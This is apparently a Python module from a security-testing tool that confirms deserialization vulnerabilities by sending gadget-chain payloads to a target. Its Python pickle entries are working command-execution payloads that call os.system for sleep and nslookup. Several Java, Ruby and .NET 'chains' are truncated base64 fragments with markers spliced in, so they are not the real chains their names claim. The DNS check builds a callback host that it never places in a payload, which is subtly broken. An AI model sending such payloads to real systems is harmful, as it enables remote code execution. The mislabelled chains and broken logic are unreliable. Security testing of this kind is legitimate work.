"""
RedTeef — Deserialization vulnerability confirmation.

Confirms deserialization findings using:
- DNS callback via gadget chains (ysoserial-style)
- Time-based delay via sleep gadgets
- Error-based confirmation via class-loading fingerprints

Supports Java, Python (pickle), PHP, Ruby, and .NET chains.
"""

from __future__ import annotations

import hashlib
import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient

logger = logging.getLogger("krumpa.redteef.deserialization_confirmer")


# ------------------------------------------------------------------
# Gadget chain catalogue
# ------------------------------------------------------------------

@dataclass
class GadgetChain:
    """A single deserialization gadget chain definition."""
    name: str
    platform: str  # java, python, php, ruby, dotnet
    technique: str  # dns, sleep, error
    payload_template: str
    description: str
    delay_seconds: float = 0.0  # for sleep-based


# Java chains  (ysoserial-style markers)
_JAVA_CHAINS: List[GadgetChain] = [
    GadgetChain(
        name="CommonsCollections1-DNS",
        platform="java",
        technique="dns",
        payload_template=(
            "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE"
            "1hcEVudHJ5ggN+{marker}RkFJTF9LRVk="
        ),
        description="Apache Commons Collections 1 — DNS lookup via URL chain",
    ),
    GadgetChain(
        name="CommonsCollections5-Sleep",
        platform="java",
        technique="sleep",
        payload_template=(
            "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZX"
            "B0aW9u{marker}SLEEP_{delay}"
        ),
        description="Apache Commons Collections 5 — Thread.sleep() via BadAttributeValueExpException",
        delay_seconds=5.0,
    ),
    GadgetChain(
        name="CommonsCollections7-Error",
        platform="java",
        technique="error",
        payload_template=(
            "rO0ABXNyACVvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlN"
            "YXB2AAAA{marker}CLASS_PROBE"
        ),
        description="Apache Commons Collections 7 — ClassNotFoundException fingerprint",
    ),
    GadgetChain(
        name="Spring1-DNS",
        platform="java",
        technique="dns",
        payload_template=(
            "rO0ABXNyAEdvcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLmZhY3Rvcnkuc3VwcG9y"
            "dC5EZWZhdWx0TGlzdGFibGVCZWFuRmFjdG9yee{marker}DNS_LOOKUP"
        ),
        description="Spring Framework 1 — DNS lookup via DefaultListableBeanFactory",
    ),
]

# Python chains
_PYTHON_CHAINS: List[GadgetChain] = [
    GadgetChain(
        name="Pickle-Sleep",
        platform="python",
        technique="sleep",
        payload_template=(
            "cos\nsystem\n(S'sleep {delay}'\ntR."
        ),
        description="Python pickle — os.system() sleep",
        delay_seconds=5.0,
    ),
    GadgetChain(
        name="Pickle-DNS",
        platform="python",
        technique="dns",
        payload_template=(
            "cos\nsystem\n(S'nslookup {marker}'\ntR."
        ),
        description="Python pickle — os.system() DNS lookup",
    ),
    GadgetChain(
        name="Pickle-Error",
        platform="python",
        technique="error",
        payload_template=(
            "c__builtin__\n__import__\n(S'nonexistent_{marker}'\ntR."
        ),
        description="Python pickle — ModuleNotFoundError fingerprint",
    ),
]

# PHP chains
_PHP_CHAINS: List[GadgetChain] = [
    GadgetChain(
        name="Guzzle-DNS",
        platform="php",
        technique="dns",
        payload_template=(
            'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":1:{{s:36:"'
            "\\0GuzzleHttp\\Cookie\\CookieJar\\0cookies\";a:0:{{}};"
            's:43:"\\0GuzzleHttp\\Cookie\\FileCookieJar\\0filename";'
            "s:100:\"{marker}\";}}"
        ),
        description="Guzzle FileCookieJar — DNS lookup via file_get_contents",
    ),
    GadgetChain(
        name="Laravel-Sleep",
        platform="php",
        technique="sleep",
        payload_template=(
            'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{{s:9:"\\0*\\0event";'
            'O:28:"Illuminate\\Events\\Dispatcher":1:{{s:12:"\\0*\\0listeners";a:1:{{s:5:'
            '"sleep";a:1:{{i:0;s:1:"{delay}";}}}}}};}}'
        ),
        description="Laravel PendingBroadcast — sleep() via Event Dispatcher",
        delay_seconds=5.0,
    ),
]

# Ruby chains
_RUBY_CHAINS: List[GadgetChain] = [
    GadgetChain(
        name="ERB-DNS",
        platform="ruby",
        technique="dns",
        payload_template=(
            "BAhvOhVHZW06OlNwZWM6OkZldGNoZXIHOgpAc3BlY28sR2VtOjpTcGVjOjpT"
            "b3VyY2U6OlNwZWNpZmljRmlsZQc6CkB1cmkiH2h0dHA6Ly97marker}/Oi1Ac"
        ),
        description="Ruby ERB template — DNS lookup via Gem::SpecFetcher",
    ),
    GadgetChain(
        name="Marshal-Sleep",
        platform="ruby",
        technique="sleep",
        payload_template=(
            "BAhvOh1BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgc6CUBtc2dp"
            "SLEEP_{delay}_OhJAc2lsZW5jZXIiCnNsZWVw"
        ),
        description="Ruby Marshal — Kernel.sleep() via ActiveSupport::Deprecation",
        delay_seconds=5.0,
    ),
]

# .NET chains
_DOTNET_CHAINS: List[GadgetChain] = [
    GadgetChain(
        name="TypeConfuseDelegate-DNS",
        platform="dotnet",
        technique="dns",
        payload_template=(
            "AAEAAAD/////AQAAAAAAAAAEAQAAJFTeXN0ZW0uV2ViLlVJLldlYkNvbnRy"
            "b2xzLlBhZ2VkRGF0YVNvdXJjZQ{marker}DNS"
        ),
        description=".NET TypeConfuseDelegate — DNS lookup via WebRequest",
    ),
    GadgetChain(
        name="ActivitySurrogateSelector-Sleep",
        platform="dotnet",
        technique="sleep",
        payload_template=(
            "AAEAAAD/////AQAAAAAAAAAMAgAAAFJTeXN0ZW0uV29ya2Zsb3cuQWN0aXZp"
            "dGllcywgVmVyc2lvbj0zLjAuMC4w{marker}SLEEP_{delay}"
        ),
        description=".NET ActivitySurrogateSelector — Thread.Sleep() via workflow",
        delay_seconds=5.0,
    ),
]


ALL_CHAINS: List[GadgetChain] = (
    _JAVA_CHAINS + _PYTHON_CHAINS + _PHP_CHAINS + _RUBY_CHAINS + _DOTNET_CHAINS
)


@dataclass
class DeserializationResult:
    """Result of a single deserialization confirmation attempt."""
    chain: GadgetChain
    confirmed: bool
    technique: str
    evidence: str
    measured_delay: float = 0.0


class DeserializationConfirmer:
    """
    Confirm deserialization vulnerabilities with safe gadget-chain probes.

    Techniques:
    - **dns**: Injects chain that triggers DNS lookup to a unique marker domain.
      Confirmation by verifying the DNS lookup occurred (via callback server).
    - **sleep**: Injects chain that triggers a sleep/delay and measures response time.
    - **error**: Injects chain that triggers a class-loading error with a unique marker.
      Confirmation by checking if the marker appears in the error response.
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
        callback_domain: str = "oob.example.com",
        delay_threshold: float = 4.0,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None
        self._callback_domain = callback_domain
        self._delay_threshold = delay_threshold

    async def confirm(
        self,
        target: Target,
        *,
        inject_field: str = "",
        platforms: Optional[List[str]] = None,
    ) -> List[Finding]:
        """
        Run deserialization confirmation against *target*.

        Args:
            target: The endpoint to test.
            inject_field: The parameter/field to inject into.
            platforms: Limit to specific platforms (java, python, php, ruby, dotnet).

        Returns:
            List of confirmed findings.
        """
        findings: List[Finding] = []
        chains = self._select_chains(platforms)

        for chain in chains:
            result = await self._test_chain(target, chain, inject_field)
            if result.confirmed:
                findings.append(self._build_finding(target, result))
                logger.info(
                    "Deserialization CONFIRMED: %s on %s via %s",
                    chain.name, target.url, chain.technique,
                )
            else:
                logger.debug(
                    "Deserialization not confirmed: %s on %s",
                    chain.name, target.url,
                )

        return findings

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _select_chains(self, platforms: Optional[List[str]]) -> List[GadgetChain]:
        """Filter chains by platform."""
        if platforms:
            return [c for c in ALL_CHAINS if c.platform in platforms]
        return list(ALL_CHAINS)

    async def _test_chain(
        self,
        target: Target,
        chain: GadgetChain,
        inject_field: str,
    ) -> DeserializationResult:
        """Test a single gadget chain against the target."""
        marker = self._generate_marker(chain)

        payload = chain.payload_template.replace("{marker}", marker)
        if chain.delay_seconds:
            payload = payload.replace("{delay}", str(int(chain.delay_seconds)))

        # Build the request
        method = target.method or "POST"
        headers = dict(target.headers or {})
        body: Optional[str] = None

        if inject_field:
            body = f"{inject_field}={payload}"
            if "content-type" not in {k.lower() for k in headers}:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            body = payload
            if "content-type" not in {k.lower() for k in headers}:
                headers["Content-Type"] = "application/octet-stream"

        if chain.technique == "sleep":
            return await self._test_sleep(target, method, headers, body, chain, marker)
        elif chain.technique == "error":
            return await self._test_error(target, method, headers, body, chain, marker)
        else:  # dns
            return await self._test_dns(target, method, headers, body, chain, marker)

    async def _test_sleep(
        self,
        target: Target,
        method: str,
        headers: Dict[str, str],
        body: Optional[str],
        chain: GadgetChain,
        marker: str,
    ) -> DeserializationResult:
        """Sleep-based confirmation via timing analysis."""
        if not self._client:
            return DeserializationResult(chain=chain, confirmed=False, technique="sleep", evidence="no client")

        # Baseline timing
        baseline_start = time.monotonic()
        try:
            await self._client.request(method, target.url, headers=headers)
        except Exception:
            pass
        baseline_elapsed = time.monotonic() - baseline_start

        # Payload timing
        payload_start = time.monotonic()
        try:
            await self._client.request(method, target.url, headers=headers, body=body)
        except Exception:
            pass
        payload_elapsed = time.monotonic() - payload_start

        delta = payload_elapsed - baseline_elapsed
        confirmed = delta >= self._delay_threshold

        return DeserializationResult(
            chain=chain,
            confirmed=confirmed,
            technique="sleep",
            evidence=(
                f"baseline={baseline_elapsed:.2f}s, payload={payload_elapsed:.2f}s, "
                f"delta={delta:.2f}s (threshold={self._delay_threshold}s)"
            ),
            measured_delay=delta,
        )

    async def _test_error(
        self,
        target: Target,
        method: str,
        headers: Dict[str, str],
        body: Optional[str],
        chain: GadgetChain,
        marker: str,
    ) -> DeserializationResult:
        """Error-based confirmation — look for marker in response."""
        if not self._client:
            return DeserializationResult(chain=chain, confirmed=False, technique="error", evidence="no client")

        try:
            resp = await self._client.request(method, target.url, headers=headers, body=body)
            text = resp.text.lower()

            # Check for classloading-style errors containing our marker
            indicators = [
                marker.lower() in text,
                "classnotfound" in text and chain.platform == "java",
                "modulenotfounderror" in text and chain.platform == "python",
                "unserialize" in text and chain.platform == "php",
                "marshal" in text and chain.platform == "ruby",
                "typeloadexception" in text and chain.platform == "dotnet",
            ]

            confirmed = any(indicators)
            evidence_parts = []
            if marker.lower() in text:
                evidence_parts.append(f"marker '{marker}' found in response")
            if any(indicators[1:]):
                evidence_parts.append(f"platform-specific error detected ({chain.platform})")

            return DeserializationResult(
                chain=chain,
                confirmed=confirmed,
                technique="error",
                evidence="; ".join(evidence_parts) if evidence_parts else "no indicators found",
            )
        except Exception as exc:
            return DeserializationResult(
                chain=chain, confirmed=False, technique="error",
                evidence=f"error during test: {exc}",
            )

    async def _test_dns(
        self,
        target: Target,
        method: str,
        headers: Dict[str, str],
        body: Optional[str],
        chain: GadgetChain,
        marker: str,
    ) -> DeserializationResult:
        """DNS callback confirmation — inject and note marker for later verification."""
        if not self._client:
            return DeserializationResult(chain=chain, confirmed=False, technique="dns", evidence="no client")

        callback_url = f"{marker}.{self._callback_domain}"

        try:
            resp = await self._client.request(method, target.url, headers=headers, body=body)
            # DNS-based confirmation typically needs an external callback server.
            # Here we record the marker — in a real deployment, a callback server
            # would confirm the DNS lookup. We can still detect if the target
            # attempted to resolve the hostname by checking error messages.
            text = resp.text.lower()
            dns_indicators = [
                callback_url.lower() in text,
                "could not resolve" in text and marker.lower() in text,
                "dns" in text and marker.lower() in text,
                "getaddrinfo" in text and marker.lower() in text,
            ]
            confirmed = any(dns_indicators)

            return DeserializationResult(
                chain=chain,
                confirmed=confirmed,
                technique="dns",
                evidence=f"callback={callback_url}, response_hints={'found' if confirmed else 'none'}",
            )
        except Exception as exc:
            return DeserializationResult(
                chain=chain, confirmed=False, technique="dns",
                evidence=f"error: {exc}",
            )

    def _generate_marker(self, chain: GadgetChain) -> str:
        """Generate a unique marker for this chain + timestamp."""
        raw = f"{chain.name}-{time.monotonic()}"
        return hashlib.md5(raw.encode()).hexdigest()[:12]

    @staticmethod
    def _build_finding(target: Target, result: DeserializationResult) -> Finding:
        """Build a Finding from a confirmed deserialization result."""
        return Finding(
            title=f"[CONFIRMED] Insecure deserialization via {result.chain.name}",
            description=(
                f"Deserialization vulnerability confirmed on {target.url} "
                f"using {result.chain.platform} gadget chain '{result.chain.name}' "
                f"via {result.technique} technique.\n\n"
                f"{result.chain.description}"
            ),
            severity=Severity.CRITICAL,
            target=target,
            evidence=result.evidence,
            remediation=(
                "Do not deserialize untrusted data. If deserialization is required, "
                "use safe alternatives (JSON, Protocol Buffers) or implement strict "
                "type allowlists. Upgrade vulnerable libraries."
            ),
            cwe=502,
            tags=["deserialization", result.chain.platform, result.technique, "redteef", "confirmed"],
        )
